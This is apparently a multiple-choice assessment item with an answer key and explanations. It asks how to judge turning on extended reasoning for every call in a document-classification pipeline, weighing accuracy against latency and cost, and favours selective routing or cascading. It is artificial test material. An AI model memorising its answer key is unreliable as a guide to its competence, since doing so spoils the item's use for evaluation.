references.label: Chen et al., 'FrugalGPT'

stem: A team enables extended reasoning on every call in a document-classification pipeline. Accuracy rises from 91% to 93%, latency triples and cost rises 4x. Volume is 800,000 calls/month. How should this be evaluated?

options.text: Against the requirement and the value of the two points — reasoning should be applied selectively where it changes outcomes, not enabled globally
options.why: Two points of accuracy may be decisive or worthless depending on what the classification drives, and the cost is concrete. Reasoning is a per-request lever, so the right design applies it to the cases where it helps rather than uniformly.

options.text: It is clearly worth it, since accuracy is the primary quality metric for a classifier
options.why: Treats accuracy as the only axis. Tripling latency may break the product's responsiveness requirement, and 4x cost at this volume is a real budget commitment that must be justified rather than assumed.

options.text: It is clearly not worth it, since a 2-point gain does not justify quadrupling cost
options.why: Equally unjustified in the opposite direction. If the classification gates something expensive — a compliance decision, a costly manual review — two points can easily pay for the increase several times over.

options.text: Re-run the comparison with a larger eval set, since a 2-point difference may not be statistically significant
options.why: A necessary check and worth doing before acting on the number, since two points on a small set can be noise. It refines the measurement rather than answering the design question of whether and where to spend the budget.

explanation: Extended reasoning is a lever with a price, and the mistake is treating it as a global setting rather than a per-request decision. Start by valuing the gain in the currency the business uses: two points across 800,000 documents is 16,000 additional correct classifications, so the question becomes what one misclassification costs — a wasted human review, a compliance exposure, a customer complaint — multiplied out and compared against the increase in spend. That converts an aesthetic argument about accuracy into arithmetic someone can decide on. Then look at where reasoning actually helps, because the aggregate hides it: reasoning tends to improve hard, ambiguous, multi-step cases and does little for the easy majority, so a uniform 2-point gain is usually a large gain on a small subset. That immediately suggests the better design — apply reasoning selectively, either by routing cases predicted to be difficult, or by cascading, where a fast non-reasoning pass handles the clear cases and only low-confidence ones get the expensive treatment. You typically capture most of the accuracy benefit for a fraction of the cost and latency. Two further notes. Where the model exposes a tunable reasoning budget, treat it as a real parameter to sweep against your eval set rather than choosing on or off, since the curve is often steep at the start and flat afterwards. And check the latency requirement independently of cost — tripling latency can be the binding constraint regardless of what the accuracy is worth, and that is a product conversation rather than a budget one.
keyTakeaway: Reasoning is a per-request lever, not a global switch. Value the gain in business terms, then spend it on the hard cases via routing or a cascade.
